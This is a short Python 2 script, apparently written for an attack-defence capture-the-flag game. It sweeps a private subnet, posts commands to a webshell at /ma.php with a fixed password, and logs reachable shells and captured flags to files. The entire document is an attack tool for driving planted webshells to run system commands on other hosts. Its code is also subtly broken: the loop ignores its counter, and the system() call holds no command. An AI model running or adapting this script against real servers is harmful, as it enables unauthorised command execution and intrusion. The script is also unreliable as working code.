import requests

url = "http://192.168.78."
url1 = ""
shell = "/ma.php"
passwd = "a"
port = "80"
payload = {passwd:'system();'}
f = open("webshelllist.txt","w")
f1 = open("firstround_flag.txt","w")
for i in range(129,133):
    url1 = url + str(1) + ":" + port + shell
    try:
        res = requests.post(url1, payload,timeout=1)
        if res.status_code == requests.codes.ok:
            print url1 + "connect shell sucess,flag is " + res.text
            print >>f1,url1 + " connect shell sucess,flag is " + res.text
            print >>f, url1 + "," + passwd
        else:
            print"shell 404"
    except:
        print url1+ "connect shell fail"
f.close()
f1.close()
